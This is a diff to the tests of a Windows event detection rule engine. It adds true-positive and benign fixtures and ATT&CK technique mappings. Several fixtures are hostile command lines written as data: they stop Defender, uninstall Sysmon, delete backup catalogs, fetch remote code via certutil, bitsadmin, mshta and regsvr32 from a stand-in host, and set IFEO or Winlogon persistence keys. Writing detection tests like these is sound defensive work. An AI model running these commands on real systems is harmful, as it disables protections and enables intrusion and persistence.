@@ -89,7 +89,9 @@ def test_security_4688_aliasing(rs):
     (dict(Channel="System", EventID=7045, ServiceName="PSEXESVC"), "TP-H07"),
     (dict(EventID=1, Image="C:\\Windows\\System32\\wbadmin.exe", CommandLine="wbadmin delete catalog -quiet"), "TP-H08"),
     (dict(Channel="Security", EventID=1102), "TP-H09"),
-    (dict(EventID=1, Image="C:\\Windows\\System32\\sc.exe", CommandLine="sc stop WinDefend"), "TP-H09"),
+    (dict(EventID=1, Image="C:\\Windows\\System32\\sc.exe", CommandLine="sc stop WinDefend"), "TP-H09b"),
+    (dict(EventID=1, Image="C:\\Windows\\Sysmon64.exe", CommandLine="sysmon64.exe -u force"), "TP-H09b"),
+    (dict(EventID=13, Image="C:\\a.exe", TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit"), "TP-H06"),
 ])
 def test_hypothesis_positive(rs, fields, rule):
     assert rule in hits(rs, ev(**fields))
@@ -101,6 +103,8 @@ def test_hypothesis_positive(rs, fields, rule):
     dict(EventID=1, Image="C:\\powershell.exe", CommandLine="powershell -ep bypass -File C:\\Scripts\\x.ps1"),
     dict(EventID=13, Image="C:\\Windows\\System32\\msiexec.exe", TargetObject="HKLM\\...\\CurrentVersion\\Run\\Vendor"),
     dict(EventID=1, Image="C:\\Windows\\System32\\vssadmin.exe", CommandLine="vssadmin list shadows"),
+    dict(EventID=13, Image="C:\\a.exe",
+         TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\app.exe\\MitigationOptions"),
 ])
 def test_benign_not_flagged(rs, fields):
     assert hits(rs, ev(**fields)) == []
@@ -122,3 +126,39 @@ def test_unsupported_product_rejected():
     with pytest.raises(RuleError):
         rule_from_dict({"title": "x", "logsource": {"product": "linux", "category": "process_creation"},
                         "detection": {"s": {"Image": "x"}, "condition": "s"}})
+
+
+def techniques(rs, rule_id, e):
+    r = rs.get(rule_id)
+    assert r.matcher(e)
+    return r.techniques_for(e)
+
+
+@pytest.mark.parametrize("rule_id,fields,expected", [
+    ("TP-H05", dict(EventID=1, Image="C:\\Windows\\System32\\rundll32.exe",
+                    CommandLine="rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\""), ["T1218.011"]),
+    ("TP-H05", dict(EventID=1, Image="C:\\Windows\\System32\\certutil.exe", CommandLine="certutil -decode a.b64 a.exe"), ["T1140"]),
+    ("TP-H05", dict(EventID=1, Image="C:\\Windows\\System32\\certutil.exe", CommandLine="certutil -urlcache -f http://x/a a"), ["T1105"]),
+    ("TP-H05", dict(EventID=1, Image="C:\\Windows\\System32\\bitsadmin.exe", CommandLine="bitsadmin /transfer j http://x/a c:\\a"), ["T1105", "T1197"]),
+    ("TP-H05", dict(EventID=1, Image="C:\\Windows\\System32\\mshta.exe", CommandLine="mshta http://x/a.hta"), ["T1218.005"]),
+    ("TP-H05", dict(EventID=1, Image="C:\\Windows\\System32\\regsvr32.exe", CommandLine="regsvr32 /i:http://x/a.sct scrobj.dll"), ["T1218.010"]),
+    ("TP-H01", dict(EventID=1, ParentImage="C:\\Office16\\WINWORD.EXE", Image="C:\\Windows\\System32\\cmd.exe", CommandLine="cmd /c x"),
+     ["T1059.003", "T1204.002", "T1566.001"]),
+    ("TP-H06", dict(EventID=13, Image="C:\\a.exe",
+                    TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger"),
+     ["T1546.012"]),
+    ("TP-H06", dict(EventID=13, Image="C:\\a.exe",
+                    TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"), ["T1547.004"]),
+    ("TP-H07", dict(EventID=1, ParentImage="C:\\Windows\\System32\\wsmprovhost.exe", Image="C:\\Windows\\System32\\cmd.exe"),
+     ["T1021.006"]),
+    ("TP-H07", dict(EventID=1, Image="C:\\Windows\\PSEXESVC.exe"), ["T1021.002", "T1569.002"]),
+])
+def test_granular_technique_mapping(rs, rule_id, fields, expected):
+    """Alerts carry only the techniques of what was actually observed."""
+    assert techniques(rs, rule_id, ev(**fields)) == expected
+
+
+def test_technique_map_must_reference_real_selections():
+    with pytest.raises(RuleError):
+        rule_from_dict({"id": "X", "title": "x", "logsource": {"channel": "sysmon", "event_id": 1},
+                        "detection": {"a": {"Image": "x"}, "condition": "a"}, "technique_map": {"b": ["T1"]}})
